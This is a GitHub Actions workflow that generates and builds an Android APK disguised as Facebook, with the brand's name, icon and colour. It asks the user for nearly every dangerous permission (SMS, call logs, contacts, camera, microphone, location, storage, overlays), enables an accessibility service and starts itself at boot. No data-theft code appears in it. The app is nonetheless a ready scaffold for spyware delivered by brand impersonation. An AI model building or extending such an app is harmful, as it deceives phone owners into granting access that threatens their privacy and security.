name: Build Facebook APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Create Android project
        run: |
          # Create all required directories
          mkdir -p app/src/main/java/com/helper/service
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi
          mkdir -p app/src/main/res/mipmap-anydpi-v26

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

          # ---------- AndroidManifest.xml ----------
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.helper.service">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
              <!-- All dangerous permissions -->
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.SEND_SMS" />
              <uses-permission android:name="android.permission.READ_CALL_LOG" />
              <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
              <uses-permission android:name="android.permission.READ_CONTACTS" />
              <uses-permission android:name="android.permission.WRITE_CONTACTS" />
              <uses-permission android:name="android.permission.READ_CALENDAR" />
              <uses-permission android:name="android.permission.WRITE_CALENDAR" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
              <application
                  android:allowBackup="true"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
                  android:icon="@mipmap/ic_launcher">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service
                      android:name=".HelperService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          # ---------- Launcher icon (blue 'F') ----------
          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path
                  android:fillColor="#1877F2"
                  android:pathData="M0,0h108v108h-108z" />
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M54,26c-15.5,0 -28,12.5 -28,28c0,13.9 10.2,25.4 23.4,27.5v-19h-7v-8.5h7v-6.5c0,-6.9 4.1,-10.7 10.4,-10.7c3,0 6.1,0.5 6.1,0.5v6.7h-3.4c-3.4,0 -4.5,2.1 -4.5,4.3v5.2h7.6l-1.2,8.5h-6.4v19c13.2,-2.1 23.4,-13.6 23.4,-27.5c0,-15.5 -12.5,-28 -28,-28z" />
          </vector>
          EOF

          # ---------- Adaptive icon XML ----------
          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          # ---------- Background color for adaptive icon ----------
          cat > app/src/main/res/values/colors.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <color name="ic_launcher_background">#1877F2</color>
          </resources>
          EOF

          # ---------- MainActivity.java ----------
          cat > app/src/main/java/com/helper/service/MainActivity.java << 'EOF'
          package com.helper.service;
          import android.Manifest;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.Toast;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.util.ArrayList;
          import java.util.List;

          public class MainActivity extends AppCompatActivity {
              private static final int PERMISSION_REQUEST_CODE = 100;
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  Button btnEnable = findViewById(R.id.btn_enable);
                  Button btnRequestPerms = findViewById(R.id.btn_request_perms);

                  btnEnable.setOnClickListener(v -> {
                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                      Toast.makeText(this, "Enable 'HelperService' from Accessibility", Toast.LENGTH_LONG).show();
                  });

                  btnRequestPerms.setOnClickListener(v -> {
                      requestAllPermissions();
                  });
              }

              private void requestAllPermissions() {
                  String[] permissions = {
                          Manifest.permission.READ_SMS,
                          Manifest.permission.RECEIVE_SMS,
                          Manifest.permission.SEND_SMS,
                          Manifest.permission.READ_CALL_LOG,
                          Manifest.permission.WRITE_CALL_LOG,
                          Manifest.permission.READ_CONTACTS,
                          Manifest.permission.WRITE_CONTACTS,
                          Manifest.permission.READ_CALENDAR,
                          Manifest.permission.WRITE_CALENDAR,
                          Manifest.permission.CAMERA,
                          Manifest.permission.RECORD_AUDIO,
                          Manifest.permission.ACCESS_FINE_LOCATION,
                          Manifest.permission.ACCESS_COARSE_LOCATION,
                          Manifest.permission.READ_EXTERNAL_STORAGE,
                          Manifest.permission.WRITE_EXTERNAL_STORAGE,
                          Manifest.permission.READ_PHONE_STATE,
                          Manifest.permission.SYSTEM_ALERT_WINDOW
                  };

                  List<String> toRequest = new ArrayList<>();
                  for (String perm : permissions) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          toRequest.add(perm);
                      }
                  }

                  if (toRequest.isEmpty()) {
                      Toast.makeText(this, "All permissions already granted.", Toast.LENGTH_SHORT).show();
                      return;
                  }

                  if (toRequest.contains(Manifest.permission.SYSTEM_ALERT_WINDOW)) {
                      toRequest.remove(Manifest.permission.SYSTEM_ALERT_WINDOW);
                      if (!Settings.canDrawOverlays(this)) {
                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                          startActivity(intent);
                      }
                  }

                  if (!toRequest.isEmpty()) {
                      ActivityCompat.requestPermissions(this,
                              toRequest.toArray(new String[0]),
                              PERMISSION_REQUEST_CODE);
                  }
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERMISSION_REQUEST_CODE) {
                      int granted = 0;
                      for (int i = 0; i < permissions.length; i++) {
                          if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                              granted++;
                          }
                      }
                      Toast.makeText(this, "Granted " + granted + "/" + permissions.length + " permissions.", Toast.LENGTH_LONG).show();
                  }
              }
          }
          EOF

          # ---------- HelperService.java ----------
          cat > app/src/main/java/com/helper/service/HelperService.java << 'EOF'
          package com.helper.service;
          import android.accessibilityservice.AccessibilityService;
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.content.Intent;
          import android.os.Build;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.widget.Toast;
          public class HelperService extends AccessibilityService {
              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  startForegroundService();
                  Log.d("HelperService", "Service connected");
                  Toast.makeText(this, "Facebook Helper is running", Toast.LENGTH_LONG).show();
              }
              private void startForegroundService() {
                  String channelId = "helper_channel";
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(channelId,
                              "Helper Service", NotificationManager.IMPORTANCE_LOW);
                      NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_MANAGER);
                      if (manager != null) manager.createNotificationChannel(channel);
                  }
                  Intent intent = new Intent(this, MainActivity.class);
                  PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                          PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                  Notification notification = new Notification.Builder(this, channelId)
                          .setContentTitle("Facebook Helper")
                          .setContentText("Running in background")
                          .setSmallIcon(android.R.drawable.ic_menu_edit)
                          .setContentIntent(pendingIntent)
                          .build();
                  startForeground(1, notification);
              }
              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {}
              @Override
              public void onInterrupt() {}
          }
          EOF

          # ---------- BootReceiver.java ----------
          cat > app/src/main/java/com/helper/service/BootReceiver.java << 'EOF'
          package com.helper.service;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.util.Log;
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  Log.d("BootReceiver", "Boot completed – starting service");
                  Intent serviceIntent = new Intent(context, HelperService.class);
                  context.startService(serviceIntent);
              }
          }
          EOF

          # ---------- activity_main.xml ----------
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent" android:layout_height="match_parent"
              android:orientation="vertical" android:padding="20dp" android:gravity="center">
              <Button android:id="@+id/btn_request_perms" android:layout_width="wrap_content"
                  android:layout_height="wrap_content" android:text="Request All Permissions" />
              <Button android:id="@+id/btn_enable" android:layout_width="wrap_content"
                  android:layout_height="wrap_content" android:text="Enable Accessibility" />
              <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
                  android:text="This app requests all permissions and runs a background service." />
          </LinearLayout>
          EOF

          # ---------- accessibility_config.xml ----------
          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault"
              android:canPerformGestures="false"
              android:canRetrieveWindowContent="false"
              android:description="@string/accessibility_desc" />
          EOF

          # ---------- strings.xml ----------
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Facebook</string>
              <string name="accessibility_desc">Facebook helper service.</string>
          </resources>
          EOF

          # ---------- build.gradle (app) ----------
          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          android {
              compileSdk 34
              namespace 'com.helper.service'
              defaultConfig {
                  applicationId 'com.helper.service'
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName '1.0'
              }
              buildTypes {
                  release { minifyEnabled false }
              }
          }
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories { google(); mavenCentral(); gradlePluginPortal() }
          }
          dependencyResolutionManagement {
              repositories { google(); mavenCentral() }
          }
          rootProject.name = "Facebook"
          include ':app'
          EOF

          cat > build.gradle << 'EOF'
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
          }
          EOF

          echo "✅ All source files created."

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.0'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.0

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Accept Android licenses
        run: yes | sdkmanager --licenses

      - name: Install Android build tools
        run: sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: Build APK
        run: chmod +x gradlew && ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Facebook-debug
          path: app/build/outputs/apk/debug/*.apk
